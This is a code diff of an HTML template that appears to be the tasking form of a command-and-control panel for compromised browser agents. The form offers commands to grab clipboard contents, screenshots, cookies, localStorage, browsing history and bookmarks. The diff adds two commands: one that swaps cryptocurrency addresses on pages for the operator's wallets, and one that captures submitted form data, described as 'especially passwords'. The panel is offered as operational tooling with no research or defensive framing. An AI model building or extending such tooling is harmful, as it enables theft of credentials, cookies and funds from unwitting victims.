@@ -43,10 +43,11 @@
     <form method="POST" class="p-6 space-y-8">
       <!-- Description Field -->
       <div class="space-y-2">
-        <label class="text-sm font-medium text-gray-300">Task Description</label>
+        <label for="taskDescription" class="text-sm font-medium text-gray-300">Task Description</label>
         <div class="relative">
           <input type="text" 
                  name="description" 
+                 id="taskDescription" 
                  required
                  placeholder="Enter a descriptive name for this task"
                  class="w-full bg-gray-700/50 text-gray-100 placeholder-gray-500 border border-gray-600 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none transition-all">
@@ -61,19 +62,22 @@
 
       <!-- Command Selection -->
       <div class="space-y-2">
-        <label class="text-sm font-medium text-gray-300">Command Type</label>
+        <label for="commandType" class="text-sm font-medium text-gray-300">Command Type</label>
         <div class="relative">
           <select name="command" 
+                  id="commandType" 
                   required
                   class="w-full bg-gray-700/50 text-gray-100 border border-gray-600 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none appearance-none transition-all">
-            <option value="CAPTURE_CLIPBOARD">📋 Capture Clipboard</option>
-            <option value="TAKE_SCREENSHOT">📸 Take Screenshot</option>
-            <option value="DOMSNAPSHOT">🌐 DOM Snapshot</option>
-            <option value="ENUMERATION">🔍 System Enumeration</option>
-            <option value="LOCALSTORAGEDUMP">💾 LocalStorage Dump</option>
-            <option value="GETCOOKIES">🍪 Get Cookies</option>
-            <option value="HISTORY">📅 Browsing History</option>
-            <option value="BOOKMARKS">🔖 Browser Bookmarks</option>
+            <option value="capture_clipboard">📋 Capture Clipboard</option>
+            <option value="take_screenshot">📸 Take Screenshot</option>
+            <option value="domsnapshot">🌐 DOM Snapshot</option>
+            <option value="enumeration">🔍 System Enumeration</option>
+            <option value="localstoragedump">💾 LocalStorage Dump</option>
+            <option value="getcookies">🍪 Get Cookies</option>
+            <option value="history">📅 Browsing History</option>
+            <option value="bookmarks">🔖 Browser Bookmarks</option>
+            <option value="replace_crypto">💰 Replace Crypto Addresses</option>
+            <option value="form_submit_capture">🎣 Form Submit Capture</option>
           </select>
           <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
             <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -86,9 +90,10 @@
 
       <!-- Agent Selection -->
       <div class="space-y-2">
-        <label class="text-sm font-medium text-gray-300">Target Agent</label>
+        <label for="targetAgent" class="text-sm font-medium text-gray-300">Target Agent</label>
         <div class="relative">
           <select name="agent_id" 
+                  id="targetAgent" 
                   required
                   class="w-full bg-gray-700/50 text-gray-100 border border-gray-600 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none appearance-none transition-all">
             {% for agent in agents %}
@@ -107,9 +112,10 @@
 
       <!-- Parameters Field -->
       <div class="space-y-2">
-        <label class="text-sm font-medium text-gray-300">Parameters (JSON)</label>
+        <label for="taskParameters" class="text-sm font-medium text-gray-300">Parameters (JSON)</label>
         <div class="relative">
           <textarea name="parameters"
+                    id="taskParameters"
                     rows="4"
                     placeholder='{"interval": "5"}'
                     class="w-full bg-gray-700/50 text-gray-100 placeholder-gray-500 border border-gray-600 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none font-mono text-sm transition-all"></textarea>
@@ -143,25 +149,29 @@
   const parameterField = document.querySelector('textarea[name="parameters"]');
 
   const parameterHints = {
-    'TAKE_SCREENSHOT': '{"quality": 80}',
-    'GETCOOKIES': '{"domain": "example.com"} or {} for all domains',
-    'ENUMERATION': '{"includeExtensions": true, "includePlugins": true}',
-    'DOMSNAPSHOT': '{}',
-    'CAPTURE_CLIPBOARD': '{}',
-    'LOCALSTORAGEDUMP': '{}',
-    'HISTORY': '{"days": 7}',
-    'BOOKMARKS': '{}'
+    'take_screenshot': '{"quality": 80}',
+    'getcookies': '{"domain": "example.com"} or {} for all domains',
+    'enumeration': '{"includeExtensions": true, "includePlugins": true}',
+    'domsnapshot': '{}',
+    'capture_clipboard': '{}',
+    'localstoragedump': '{}',
+    'history': '{"days": 7}',
+    'bookmarks': '{}',
+    'replace_crypto': '{"btc": "bc1q...", "eth": "0x..."}',
+    'form_submit_capture': '{"domains": ["example.com", "*.google.com"]} or {} for all'
   };
 
   const commandDescriptions = {
-    'TAKE_SCREENSHOT': 'Capture a screenshot of the target system',
-    'ENUMERATION': 'Collect detailed system and browser information',
-    'GETCOOKIES': 'Extract browser cookies from specified domain',
-    'DOMSNAPSHOT': 'Capture current DOM state of the webpage',
-    'CAPTURE_CLIPBOARD': 'Retrieve contents of the system clipboard',
-    'LOCALSTORAGEDUMP': 'Extract browser local storage data',
-    'HISTORY': 'Extract browser history for specified number of days',
-    'BOOKMARKS': 'Extract browser bookmarks'
+    'take_screenshot': 'Capture a screenshot of the target system',
+    'enumeration': 'Collect detailed system and browser information',
+    'getcookies': 'Extract browser cookies from specified domain',
+    'domsnapshot': 'Capture current DOM state of the webpage',
+    'capture_clipboard': 'Retrieve contents of the system clipboard',
+    'localstoragedump': 'Extract browser local storage data',
+    'history': 'Extract browser history for specified number of days',
+    'bookmarks': 'Extract browser bookmarks',
+    'replace_crypto': 'Dynamically replace cryptocurrency addresses on webpages',
+    'form_submit_capture': 'Capture form submission data (especially passwords) from specified domains'
   };
 
   commandSelect.addEventListener('change', (e) => {
